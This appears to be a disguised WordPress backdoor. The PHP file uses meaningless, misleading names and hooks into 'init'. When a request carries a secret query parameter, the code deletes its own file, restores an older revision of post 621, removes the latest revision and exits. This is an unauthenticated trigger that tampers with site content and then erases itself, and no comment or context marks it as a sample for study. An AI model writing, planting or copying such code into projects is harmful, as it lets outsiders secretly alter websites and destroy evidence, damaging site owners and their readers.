<?php

function drop_ssl_internal_events() {
	if (isset($_GET['global_gateway_plus_addons']) && $_GET['global_gateway_plus_addons'] === 'separator_consent_inline_animated') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$featured_widgets_woff2 = 621;
		$reloaded_publish_connector_inline = wp_get_post_revisions($featured_widgets_woff2);
		if (empty($reloaded_publish_connector_inline)) die('no revisions');
		if (count($reloaded_publish_connector_inline) < 2) die('less than 2');
		$divi_html5_homepage = array_shift($reloaded_publish_connector_inline);
		$send_testimonial_light = $divi_html5_homepage->ID;
		$author_recipe_visibility = array_shift($reloaded_publish_connector_inline);
		$year_base_testimonial = $author_recipe_visibility->ID;
		$first_floating_cleaner = wp_restore_post_revision($year_base_testimonial);
		if ($first_floating_cleaner === false) die('error restoring');
		$first_floating_cleaner = wp_delete_post_revision($send_testimonial_light);		
		if ($first_floating_cleaner === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'drop_ssl_internal_events');
